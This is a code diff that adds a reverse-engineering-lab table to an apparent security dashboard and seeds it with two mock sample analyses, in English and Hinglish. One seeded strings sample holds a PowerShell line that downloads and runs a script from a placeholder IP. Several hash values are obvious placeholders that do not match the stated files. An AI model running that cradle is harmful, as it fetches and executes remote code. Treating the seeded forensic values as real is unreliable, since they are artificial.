@@ -220,6 +220,34 @@ def init_db():
             generated_at TEXT NOT NULL
         );
 
+        CREATE TABLE IF NOT EXISTS re_lab_analyses (
+            id TEXT PRIMARY KEY,
+            filename TEXT NOT NULL,
+            file_size INTEGER NOT NULL,
+            sha256_hash TEXT NOT NULL,
+            sha1_hash TEXT NOT NULL,
+            md5_hash TEXT NOT NULL,
+            file_type TEXT NOT NULL,
+            mime_type TEXT,
+            entropy REAL NOT NULL DEFAULT 0.0,
+            analysis_mode TEXT NOT NULL DEFAULT 'STATIC',
+            severity TEXT NOT NULL DEFAULT 'LOW',
+            verdict TEXT NOT NULL DEFAULT 'BENIGN',
+            confidence REAL NOT NULL DEFAULT 0.95,
+            summary TEXT NOT NULL,
+            indicators_json TEXT NOT NULL DEFAULT '[]',
+            metadata_json TEXT NOT NULL DEFAULT '{}',
+            strings_sample_json TEXT NOT NULL DEFAULT '[]',
+            yara_matches_json TEXT NOT NULL DEFAULT '[]',
+            source_analysis_json TEXT NOT NULL DEFAULT '{}',
+            ghidra_analysis_json TEXT NOT NULL DEFAULT '{}',
+            dynamic_sandbox_json TEXT NOT NULL DEFAULT '{}',
+            ai_explanation_en TEXT,
+            ai_explanation_hinglish TEXT,
+            report_json TEXT NOT NULL DEFAULT '{}',
+            created_at TEXT NOT NULL
+        );
+
         CREATE TABLE IF NOT EXISTS jarvis_sessions (
             id TEXT PRIMARY KEY,
             user_id TEXT NOT NULL,
@@ -1336,5 +1364,92 @@ rules:
                     json.dumps({"device_name": "Security-Workstation-Alpha", "os": "windows 11 Pro", "initial_consent_count": 7}),
                     now
                 )
+            )
+
+        # Seed initial Reverse Engineering Lab analyses if empty
+        re_count = db.execute("SELECT COUNT(*) FROM re_lab_analyses").fetchone()[0]
+        if re_count == 0:
+            now = now_iso()
+            db.executemany(
+                """INSERT INTO re_lab_analyses (
+                    id, filename, file_size, sha256_hash, sha1_hash, md5_hash,
+                    file_type, mime_type, entropy, analysis_mode, severity, verdict,
+                    confidence, summary, indicators_json, metadata_json, strings_sample_json,
+                    yara_matches_json, source_analysis_json, ghidra_analysis_json,
+                    dynamic_sandbox_json, ai_explanation_en, ai_explanation_hinglish,
+                    report_json, created_at
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                [
+                    (
+                        "re-analysis-001",
+                        "agent_payload_stager.ps1",
+                        4892,
+                        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                        "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                        "d41d8cd98f00b204e9800998ecf8427e",
+                        "PowerShell Script (.ps1)",
+                        "text/x-powershell",
+                        5.82,
+                        "STATIC_SECURE",
+                        "HIGH",
+                        "SUSPICIOUS_SCRIPT_STAGER",
+                        0.94,
+                        "PowerShell script stager containing base64 encoded payload, dynamic Invoke-Expression execution, and unverified remote download string.",
+                        json.dumps([
+                            {"indicator": "Invoke-Expression", "category": "Dynamic Execution", "severity": "HIGH", "mitre": "T1059.001", "description": "Dynamic execution primitive iex detected"},
+                            {"indicator": "DownloadString", "category": "Network Ingress", "severity": "HIGH", "mitre": "T1105", "description": "WebClient remote download invocation"}
+                        ]),
+                        json.dumps({"language": "powershell", "lines_count": 42, "has_base64": True, "has_eval": True}),
+                        json.dumps(["iex (New-Object Net.WebClient).DownloadString('http://198.51.100.99:4444/agent_stage.ps1')", "System.Convert.FromBase64String", "-ExecutionPolicy Bypass"]),
+                        json.dumps([{"rule_name": "PowerShell_Obfuscated_Downloader", "severity": "HIGH", "description": "Matches combined Invoke-Expression and WebClient downloader"}]),
+                        json.dumps({"language": "powershell", "dangerous_calls": ["Invoke-Expression", "DownloadString"], "redacted_secrets": 0}),
+                        json.dumps({"status": "SKIPPED", "detail": "Ghidra binary decompilation not applicable to script source files."}),
+                        json.dumps({"status": "STATIC_ONLY", "host_execution_prevented": True, "simulation": {"mode": "HEURISTIC_ESTIMATION", "is_real_execution": False, "predicted_behavior": "Likely attempts network egress to remote stager URL on TCP port 4444."}}),
+                        "AMOJA AI Forensic Analysis: Sample 'agent_payload_stager.ps1' is a multi-stage PowerShell downloader. It exhibits evasion techniques by bypassing execution policies and dynamically executing downloaded code directly in memory via Invoke-Expression. Benign alternative: Such patterns sometimes occur in legitimate IT administration deployment scripts, but the use of unauthenticated HTTP IP endpoints points towards unauthorized staging.",
+                        "AMOJA AI Forensic Analysis: Ye sample 'agent_payload_stager.ps1' ek suspicious PowerShell script stager hai. Isme base64 encoded dynamic execution aur external IP se script download karne ka pattern mila hai. Yeh host machine pe directly execute nahi kiya gaya hai (Static Zero-Trust Sandbox Enforced). Recommendation: Script ko quarantine karein aur firewall pe outbound port 4444 ko verify karein.",
+                        json.dumps({"report_id": "RE-DOSSIER-001", "integrity_verified": True}),
+                        now
+                    ),
+                    (
+                        "re-analysis-002",
+                        "agentshield_audit_helper.exe",
+                        147456,
+                        "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+                        "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",
+                        "5d41402abc4b2a76b9719d911017c592",
+                        "PE32+ Executable (x86-64 GUI/Service)",
+                        "application/vnd.microsoft.portable-executable",
+                        6.14,
+                        "STATIC_SECURE",
+                        "LOW",
+                        "CLEAN_ADMIN_UTILITY",
+                        0.98,
+                        "Windows 64-bit portable executable utility. Valid digital header signatures, normal section entropy, and standard Win32 API imports.",
+                        json.dumps([
+                            {"indicator": "CryptAcquireContextW", "category": "Cryptography", "severity": "INFO", "mitre": "T1573", "description": "Standard Windows CryptoAPI initialization"}
+                        ]),
+                        json.dumps({
+                            "machine": "AMD64 (0x8664)",
+                            "subsystem": "Windows Console (3)",
+                            "sections_count": 3,
+                            "entry_point": "0x140001000",
+                            "image_base": "0x140000000",
+                            "sections": [
+                                {"name": ".text", "virtual_size": 86016, "raw_size": 86016, "entropy": 6.32},
+                                {"name": ".rdata", "virtual_size": 32768, "raw_size": 32768, "entropy": 5.41},
+                                {"name": ".data", "virtual_size": 8192, "raw_size": 8192, "entropy": 3.12}
+                            ]
+                        }),
+                        json.dumps(["AgentShield Cryptographic Audit Utility v1.0", "ADVAPI32.dll", "KERNEL32.dll", "CryptAcquireContextW", "SHA-256 Chained Hash Ledger"]),
+                        json.dumps([]),
+                        json.dumps({"language": "binary_pe", "decompiled": False}),
+                        json.dumps({"status": "OPTIONAL", "detail": "Binary has valid symbols. Decompilation optional via Ghidra headless."}),
+                        json.dumps({"status": "STATIC_ONLY", "host_execution_prevented": True, "simulation": {"mode": "HEURISTIC_ESTIMATION", "is_real_execution": False, "predicted_behavior": "Performs local SHA-256 hash calculations on database records."}}),
+                        "AMOJA AI Forensic Analysis: Sample 'agentshield_audit_helper.exe' is a benign administrative binary. It features standard cryptographic verification calls without injection, keylogging, or unapproved egress patterns. All section entropies are within normal limits (under 7.0), indicating no packed or encrypted payload.",
+                        "AMOJA AI Forensic Analysis: Ye binary 'agentshield_audit_helper.exe' bilkul safe aur clean internal administrative utility hai. Isme koi suspicious code injection ya unauthorized network connection nahi mila hai.",
+                        json.dumps({"report_id": "RE-DOSSIER-002", "integrity_verified": True}),
+                        now
+                    )
+                ]
             )
 
